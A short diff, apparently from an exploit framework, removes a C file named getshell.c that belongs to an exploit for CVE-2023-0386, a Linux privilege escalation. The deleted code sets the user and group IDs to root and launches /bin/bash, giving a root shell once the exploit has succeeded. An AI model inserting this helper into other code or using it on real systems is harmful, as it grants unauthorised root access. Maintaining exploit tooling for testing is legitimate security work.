--- external/source/exploits/CVE-2023-0386/getshell.c
@@ -1,21 +1,0 @@
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-
-
-int main(int argc, char const *argv[]) {
-    if (setuid(0) < 0) {
-        perror("setuid");
-        return -1;
-    }
-
-    if (setgid(0) < 0) {
-        perror("setgid");
-        return -1;
-    }
-
-    system("/bin/bash");
-
-    return 0;
-}
